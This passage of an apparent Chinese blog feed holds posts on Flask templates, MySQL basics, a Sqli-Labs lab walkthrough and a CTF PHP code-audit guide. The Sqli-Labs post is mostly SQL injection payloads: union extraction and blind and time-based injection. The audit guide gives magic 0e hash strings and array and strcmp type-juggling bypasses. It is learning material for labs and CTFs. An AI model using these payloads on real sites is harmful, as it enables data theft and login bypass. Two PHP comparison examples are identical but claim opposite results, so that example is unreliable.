class="hljs-string">&#x27;/profile/&lt;username&gt;&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">profile</span>(<span class="hljs-params">username</span>):    user = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: username, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">25</span>&#125;    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;profile.html&#x27;</span>, user=user)</code></pre></div><ul><li>引用方法</li></ul><div class="code-wrapper"><pre><code class="hljs jinja2">&lt;h1&gt;&#123;&#123; user.name &#125;&#125;&lt;/h1&gt;&lt;p&gt;Age: &#123;&#123; user.age &#125;&#125;&lt;/p&gt;</code></pre></div><h1 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h1>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Flask</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sqli-Labs 通关文档</title>
    <link href="/Sqli-Labs-%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/"/>
    <url>/Sqli-Labs-%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="安装-【docker-版本】"><a href="#安装-【docker-版本】" class="headerlink" title="安装 【docker 版本】"></a>安装 【docker 版本】</h1><ul><li>拉取 sqli-labs 镜像</li></ul><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker pull acgpiano/sqli-labs</code></pre></div><ul><li>启动镜像</li></ul><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run -dt --name sqli -p 1234:80 acgpiano/sqli-labs</code></pre></div><ul><li>在浏览器访问 <code>1234</code> 端口</li></ul><p><img src="/./Sqli-Labs-%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/image-20251110210410763.png" alt="image-20251110210410763"></p><p><img src="/./Sqli-Labs-%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/image-20251110210422709.png" alt="image-20251110210422709"></p><p>安装完成。</p><h1 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h1><blockquote><p>单引号闭合问题</p></blockquote><p>payload:</p><div class="code-wrapper"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-11</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- asd</span></code></pre></div><h1 id="Less-02"><a href="#Less-02" class="headerlink" title="Less-02"></a>Less-02</h1><blockquote><p>数字型注入</p></blockquote><p>payload:</p><div class="code-wrapper"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-11</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()</code></pre></div><h1 id="Less-03"><a href="#Less-03" class="headerlink" title="Less-03"></a>Less-03</h1><blockquote><p>单引号 + 小括号</p></blockquote><p>payload</p><div class="code-wrapper"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) -- asd </span></code></pre></div><h1 id="Less-04"><a href="#Less-04" class="headerlink" title="Less-04"></a>Less-04</h1><blockquote><p>双引号 + 小括号</p></blockquote><p>payload</p><div class="code-wrapper"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) -- asd</code></pre></div><h1 id="Less-05"><a href="#Less-05" class="headerlink" title="Less-05"></a>Less-05</h1><blockquote><p>盲注 单引号闭合</p></blockquote><p>payload</p><div class="code-wrapper"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; and if(0,1,0)-- asd</span></code></pre></div><h1 id="Less-06"><a href="#Less-06" class="headerlink" title="Less-06"></a>Less-06</h1><blockquote><p>盲注 + 双引号闭合</p></blockquote><p>payload</p><div class="code-wrapper"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">2</span>&quot; and if(0,1,0)-- asd</code></pre></div><h1 id="Less-07"><a href="#Less-07" class="headerlink" title="Less-07"></a>Less-07</h1><blockquote><p>盲注 + 单引号+ 双层小括号闭合</p></blockquote><p>payload</p><div class="code-wrapper"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)) and if(1,1,0) -- asd</span></code></pre></div><h1 id="Less-08"><a href="#Less-08" class="headerlink" title="Less-08"></a>Less-08</h1><blockquote><p>盲注 + 单引号闭合</p></blockquote><p>payload</p><div class="code-wrapper"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(1,1,0) -- asd</span></code></pre></div><h1 id="Less-09"><a href="#Less-09" class="headerlink" title="Less-09"></a>Less-09</h1><blockquote><p>时间盲注，单引号闭合</p></blockquote><p>payload</p><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-number">2</span><span class="hljs-string">&#x27; and if(1,sleep(5),0) -- asd</span></code></pre></div><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><blockquote><p>时间盲注，双引号闭合</p></blockquote><p>payload</p><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-number">1</span>&quot; and if(1,sleep(5),0) -- asd</code></pre></div><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><blockquote><p>post 注入 单引号闭合</p></blockquote><p>payload</p><div class="code-wrapper"><pre><code class="hljs sql">a<span class="hljs-string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql增删改查基础</title>
    <link href="/Mysql%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E5%9F%BA%E7%A1%80/"/>
    <url>/Mysql%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="首先启动数据库"><a href="#首先启动数据库" class="headerlink" title="首先启动数据库"></a>首先启动数据库</h3><ul><li>Linux :</li></ul><div class="code-wrapper"><pre><code class="hljs sql">sudo systemctl <span class="hljs-keyword">start</span> mysql</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash">mysql -h 数据库地址 -u 用户名 -p 密码</code></pre></div><ul><li>windows：<ul><li>进入mysql 目录下的 bin 目录，打开cmd</li></ul></li></ul><h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> databases;</code></pre></div><h3 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h3><div class="code-wrapper"><pre><code class="hljs sql">use [数据库名];</code></pre></div><h3 id="查看数据表"><a href="#查看数据表" class="headerlink" title="查看数据表"></a>查看数据表</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> tables;</code></pre></div><h3 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">desc</span> [数据表名];</code></pre></div><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><h3 id="创建一个数据库"><a href="#创建一个数据库" class="headerlink" title="创建一个数据库"></a>创建一个数据库</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database [数据库名];</code></pre></div><h3 id="创建一个数据表"><a href="#创建一个数据表" class="headerlink" title="创建一个数据表"></a>创建一个数据表</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">create table</span> [数据表名] (    字段名<span class="hljs-number">1</span> 字段类型，    字段名<span class="hljs-number">2</span> 字段类型);</code></pre></div><p>eg:</p><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">create table</span> <span class="hljs-keyword">user</span> (    id <span class="hljs-type">int</span>(<span class="hljs-number">20</span>),    name <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),    password <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>));</code></pre></div><h3 id="增加数据"><a href="#增加数据" class="headerlink" title="增加数据"></a>增加数据</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> aaa <span class="hljs-keyword">values</span> (值<span class="hljs-number">1</span>,值<span class="hljs-number">2.</span>..);</code></pre></div><p>注意 插入的字段数必须和表结构中原有的字段数相同</p><p>方法2：指定字段添加数据</p><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> aaa (字段<span class="hljs-number">1</span>,字段<span class="hljs-number">2</span>) <span class="hljs-keyword">values</span> (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>);</code></pre></div><p>注意：值如果是整型不用加引号，如果是字符串必须加引号</p><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">drop</span> database [数据库名];</code></pre></div><h3 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> [数据表名];</code></pre></div><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> [表名] <span class="hljs-keyword">where</span> 条件</code></pre></div><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><h3 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> 表名<span class="hljs-keyword">set</span> 字段名<span class="hljs-number">1</span> <span class="hljs-operator">=</span> 字段值<span class="hljs-number">1</span> ， [字段名<span class="hljs-number">2</span> <span class="hljs-operator">=</span> 字段值<span class="hljs-number">2</span>]；<span class="hljs-keyword">where</span> 条件语句；# <span class="hljs-keyword">where</span> <span class="hljs-operator">+</span> 条件 更新部分数据 <span class="hljs-operator">||</span> 不加<span class="hljs-keyword">where</span>子句更新全部数据</code></pre></div><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><h3 id="普通查询"><a href="#普通查询" class="headerlink" title="普通查询"></a>普通查询</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> [字段] <span class="hljs-keyword">from</span> [表] <span class="hljs-keyword">where</span> 条件</code></pre></div><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> [字段] <span class="hljs-keyword">from</span> [表] <span class="hljs-keyword">where</span> [字段] <span class="hljs-operator">=</span> (<span class="hljs-keyword">select</span> [字段] <span class="hljs-keyword">from</span> [表] <span class="hljs-keyword">where</span> [条件])</code></pre></div><p>eg:</p><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> artical1 <span class="hljs-keyword">where</span> <span class="hljs-keyword">value</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;helloworld&#x27;</span>);</code></pre></div><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>条件：表1 和 表2 的字段数必须相同</p><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span></code></pre></div><h3 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h3><p>下划线通配符 （_）</p><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> str <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%str%&#x27;</span>;</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>Mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-PHP代码审计</title>
    <link href="/CTF-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/CTF-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><blockquote><p>包括系统预定义变量, 弱类型语言，错误控制运算符，变量默认值等等，有基础可跳过</p></blockquote><h2 id="超全局变量-预定义常量"><a href="#超全局变量-预定义常量" class="headerlink" title="超全局变量 - 预定义常量"></a>超全局变量 - 预定义常量</h2><ul><li>$_POST</li><li>$_GET</li><li>$_COOKIE</li><li>$_SESSION</li><li>$_FILE</li><li>$_REQUEST</li><li>$_SERVER</li><li>$_ENV          环境数据</li><li>$GLOBALS    所有全局变量</li></ul><h2 id="变量的默认值"><a href="#变量的默认值" class="headerlink" title="变量的默认值"></a>变量的默认值</h2><blockquote><p>当各种类型的变量在被定义但未赋值的时候，他们的默认值</p></blockquote><ul><li>Interger   &#x3D;&gt;   0</li><li>float &#x3D;&gt;       0.0</li><li>string &#x3D; &gt;  ‘’</li><li>array  &#x3D; &gt;  array()</li><li>boolean   &#x3D;&gt;  false</li><li>object   &#x3D;&gt;    空对象</li></ul><h2 id="错误控制运算符"><a href="#错误控制运算符" class="headerlink" title="错误控制运算符"></a>错误控制运算符</h2><blockquote><p>@ 符号</p><p>将 @ 符号放置在 一个 php 表达式的前面，这个表达式所产生的任何信息都会被忽略掉</p></blockquote><h2 id="弱类型特性"><a href="#弱类型特性" class="headerlink" title="弱类型特性"></a>弱类型特性</h2><blockquote><p>在 php 中 有两种判断相等的比较符号 &#x3D;&#x3D; 和 &#x3D;&#x3D;&#x3D;</p></blockquote><ul><li>&#x3D;&#x3D; 不会判断变量的类型</li><li>&#x3D;&#x3D;&#x3D; 会判断变量的类型</li></ul><p>举例：</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$param1</span> = <span class="hljs-number">5</span>;<span class="hljs-variable">$param2</span> = <span class="hljs-string">&#x27;5&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$param1</span> == <span class="hljs-variable">$param2</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;True&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;False&quot;</span>;&#125;<span class="hljs-comment">//返回结果为True</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$param1</span> = <span class="hljs-number">5</span>;<span class="hljs-variable">$param2</span> = <span class="hljs-string">&#x27;5&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$param1</span> == <span class="hljs-variable">$param2</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;True&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;False&quot;</span>;&#125;<span class="hljs-comment">// 返回结果为 False</span></code></pre></div><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><table><thead><tr><th>元字符</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>0次、1次或多次匹配其前一位</td></tr><tr><td>+</td><td>1次或多次匹配其前的原子</td></tr><tr><td>？</td><td>0次或1次匹配</td></tr><tr><td>|</td><td>匹配两个或者多个选择</td></tr><tr><td>^</td><td>匹配字符串串首</td></tr><tr><td>$</td><td>匹配字符串</td></tr><tr><td>[]</td><td>匹配方括号中任一原子</td></tr><tr><td>[^]</td><td>匹配除方括号中的原子外的任何字符</td></tr><tr><td>{m}</td><td>表示其前原子恰好出现m次</td></tr><tr><td>{m,n}</td><td>表示其前原子 （n&gt;m）</td></tr><tr><td>{m，}</td><td>表示其前原子出现不少于m次</td></tr><tr><td>（）</td><td>整体表示一个原子</td></tr><tr><td>.</td><td>匹配除换行之外的任何一个字符</td></tr></tbody></table><div class="code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>); <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;     <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];     <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?zkaqzkaq/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;         <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);     &#125;     <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;zkaqzkaq&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;         <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);     &#125;     <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; &#125; </code></pre></div><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul><li>preg_match 函数只能处理字符串，当传入的参数为数组时会返回 false</li><li>回溯绕过</li><li>%0a 换行绕过</li></ul><h1 id="函数审计"><a href="#函数审计" class="headerlink" title="函数审计"></a>函数审计</h1><h2 id="is-numeric-函数"><a href="#is-numeric-函数" class="headerlink" title="is_numeric 函数"></a>is_numeric 函数</h2><div class="code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$num</span></span>)</span>&#123;    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$num</span>;&#125;<span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) <span class="hljs-keyword">and</span> <span class="hljs-variable">$num</span>!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$num</span>)!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$num</span>)==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!!&quot;</span>;&#125;</code></pre></div><p>绕过 ： 前面加上 %09 %0a %0b %0c %0d 等空字符</p><p>is_numeric() 函数对于 %00 这类空字符，不管是放在前后都可以判断为非数值，而%20空格字符只能放在数值后，因为查看函数发现改函数对于第一个空格字符会跳过空格字符直接判断后面的内容</p><h2 id="md5-sha1-函数"><a href="#md5-sha1-函数" class="headerlink" title="md5 sha1 函数"></a>md5 sha1 函数</h2><ol><li>对于php强比较和弱比较： md5() ,sha1() 函数无法处理数组，如果传入的为数组，两个数组经过加密后都是 NULL ，也就是相等的。</li><li>对于某些特殊的字符串加密后得到的密文以 0e 开头，php 会当作可续计数法来处理，也就是 0 的n 次方，得到的值比较的时候 都相同。</li></ol><p>payload:</p><div class="code-wrapper"><pre><code class="hljs dns">md5： <span class="hljs-number">240610708</span>:<span class="hljs-number">0</span>e4620974319065090195<span class="hljs-number">62988736854</span>QLTHNDT:<span class="hljs-number">0</span>e40596782540195537<span class="hljs-number">2549139051580</span>QNKCDZO:<span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span>PJNPDWY:<span class="hljs-number">0</span>e2915290528947027745<span class="hljs-number">57631701704</span>NWWKITQ:<span class="hljs-number">0</span>e7630820709760383476<span class="hljs-number">57360817689</span>NOOPCJF:<span class="hljs-number">0</span>e818888003657176127<span class="hljs-number">862245791911</span>MMHUWUV:<span class="hljs-number">0</span>e701732711630150438<span class="hljs-number">129209816536</span>MAUXXQC:<span class="hljs-number">0</span>e4784784668484390404<span class="hljs-number">34801845361</span> sha1： <span class="hljs-number">10932435112</span>: <span class="hljs-number">0</span>e0776691500413317634705586<span class="hljs-number">5026311692244</span>aaroZmOk: <span class="hljs-number">0</span>e66507019969427134894567494<span class="hljs-number">305185566735</span>aaK1STfY: <span class="hljs-number">0</span>e766585266557562076882711596<span class="hljs-number">24026011393</span>aaO8zKZF: <span class="hljs-number">0</span>e89257456677279068558073954<span class="hljs-number">252716165668</span>aa3OFF9m: <span class="hljs-number">0</span>e369777862785179849592603940<span class="hljs-number">24281014729</span><span class="hljs-number">0</span>e<span class="hljs-number">1290633704</span>: <span class="hljs-number">0</span>e19985187802402577070739524<span class="hljs-number">195726831799</span></code></pre></div><p>eg:</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-variable">$name</span> != <span class="hljs-variable">$pass</span>)&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$name</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>))&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;True: flag&quot;</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wrong&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><ul><li><p>使用数组绕过</p><ul><li><code>http://localhost/?name[]=aaa&amp;pass[]=bbb</code></li></ul></li><li><p>使用特殊值绕过</p><ul><li><code>http://localhost/?name=QLTHNDT&amp;pass=QNKCDZO</code></li></ul></li></ul><p>案例：</p><div class="code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>    <span class="hljs-comment">// include(&#x27;flag.php&#x27;);</span>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];    <span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v2</span>))&#123;        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$v1</span>))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v1 error&quot;</span>);        &#125;        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v2 error&quot;</span>);        &#125;        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v2</span>))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;asd&#125;&quot;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is flag?&quot;</span>;    &#125;<span class="hljs-meta">?&gt;</span> </code></pre></div><h2 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp 函数"></a>strcmp 函数</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$str1</span>,<span class="hljs-variable">$str2</span>)<span class="hljs-comment">//strcmp 函数是比较两个字符串，如果str1&lt;str2 则返回 &lt; 0 。如果str1&gt;str2 则返回 &gt; 0 。 如果两者相等则返回 0；</span></code></pre></div><p><strong>strcmp 比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值为0，一般利用这一点进行绕过</strong></p><ul><li>flag.php</li></ul><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;lkasjhfdasdhfasiu8dfhawes&#125;&#x27;</span>;<span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;asddddddddddddddddd&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><ul><li>index.php</li></ul><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>],<span class="hljs-variable">$password</span>) == <span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$flag</span>&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="switch-函数"><a href="#switch-函数" class="headerlink" title="switch 函数"></a>switch 函数</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span 